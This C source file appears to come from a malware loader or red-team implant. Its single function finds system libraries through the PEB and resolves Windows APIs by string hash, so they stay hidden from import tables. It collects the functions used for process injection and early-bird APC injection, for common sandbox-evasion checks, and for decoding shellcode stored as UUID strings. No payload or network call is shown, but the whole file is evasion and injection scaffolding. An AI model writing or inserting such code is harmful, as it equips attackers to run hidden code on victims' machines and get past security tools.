#include <common.h>

extern GATE Gate;

VOID InitializeGate() {
    // Get required libraries
    if ( ! ( Gate.Modules.Ntdll.BaseAddress         = LdrModulePeb( H_MODULE_NTDLL ) ) )       return;
    if ( ! ( Gate.Modules.Kernel32.BaseAddress      = LdrModulePeb( H_MODULE_KERNEL32 ) ) )    return;

    // Enable debug printing
    if ( ! ( Gate.Win32.LoadLibraryW                = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "LoadLibraryW" ) ) ) ) return;
    if ( ! ( Gate.Win32.WriteFile                   = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "WriteFile" ) ) ) )    return;
    if ( ! ( Gate.Win32.GetStdHandle                = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "GetStdHandle" ) ) ) ) return;
    if ( ! ( Gate.Modules.User32.BaseAddress        = (PBYTE)Gate.Win32.LoadLibraryW(L"User32")) ) return;
    if ( ! ( Gate.Win32.wvsprintfA                  = LdrFunction(Gate.Modules.User32.BaseAddress, HASH_STR( "wvsprintfA" ) ) ) ) return;

    DEBUG_PRINT("[!] Block 1 loaded.");

    if ( ! ( Gate.Win32.CreateToolhelp32Snapshot    = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "CreateToolhelp32Snapshot" ) ) ) ) return;
    if ( ! ( Gate.Win32.Process32First              = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "Process32First" ) ) ) ) return;
    if ( ! ( Gate.Win32.Process32Next               = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "Process32Next" ) ) ) ) return;
    if ( ! ( Gate.Win32.OpenProcess                 = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "OpenProcess" ) ) ) ) return;
    if ( ! ( Gate.Win32.GetProcAddress              = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "GetProcAddress" ) ) ) ) return;
    if ( ! ( Gate.Win32.Sleep                       = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "Sleep" ) ) ) ) return;
    
    DEBUG_PRINT("[!] Block 2 loaded.");

    if ( ! ( Gate.Win32.GetModuleHandleA            = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "GetModuleHandleA" ) ) ) ) return;
    if ( ! ( Gate.Win32.ReadProcessMemory           = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "ReadProcessMemory" ) ) ) ) return;
    if ( ! ( Gate.Win32.WriteProcessMemory          = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "WriteProcessMemory" ) ) ) ) return;
    if ( ! ( Gate.Win32.VirtualAllocEx              = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "VirtualAllocEx" ) ) ) ) return;
    if ( ! ( Gate.Win32.VirtualProtectEx            = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "VirtualProtectEx" ) ) ) ) return;
    if ( ! ( Gate.Win32.VirtualFreeEx               = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "VirtualFreeEx" ) ) ) ) return;
    if ( ! ( Gate.Win32.GetLastError                = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "GetLastError" ) ) ) ) return;
    if ( ! ( Gate.Win32.CloseHandle                 = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "CloseHandle" ) ) ) ) return;

    DEBUG_PRINT("[!] Block 3 loaded.");

    if ( ! ( Gate.Win32.CreateProcessA              = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "CreateProcessA" ) ) ) ) return;
    if ( ! ( Gate.Win32.QueueUserAPC                = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "QueueUserAPC" ) ) ) ) return;
    if ( ! ( Gate.Win32.ResumeThread                = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "ResumeThread" ) ) ) ) return;
    if ( ! ( Gate.Win32.VirtualAlloc                = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "VirtualAlloc" ) ) ) ) return;
    if ( ! ( Gate.Win32.EnumChildWindows            = LdrFunction(Gate.Modules.User32.BaseAddress,   HASH_STR( "EnumChildWindows" ) ) ) ) return;
    if ( ! ( Gate.Win32.VirtualAllocExNuma          = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "VirtualAllocExNuma" ) ) ) ) return;
    if ( ! ( Gate.Win32.FlsAlloc                    = LdrFunction(Gate.Modules.Kernel32.BaseAddress, HASH_STR( "FlsAlloc" ) ) ) ) return;

    DEBUG_PRINT("[!] Block 4 loaded.");

    if ( ! ( Gate.Modules.RPCRT4.BaseAddress         = (PBYTE)Gate.Win32.LoadLibraryW(L"Rpcrt4")) ) {
        DEBUG_PRINT("[!] Failed to load Rpcrt4.dll. Aborting!");
        return;
    }
    if ( ! ( Gate.Win32.UuidFromStringA             = LdrFunction(Gate.Modules.RPCRT4.BaseAddress, HASH_STR( "UuidFromStringA" ) ) ) ) return;

    DEBUG_PRINT("[!] Block 5 loaded.");
}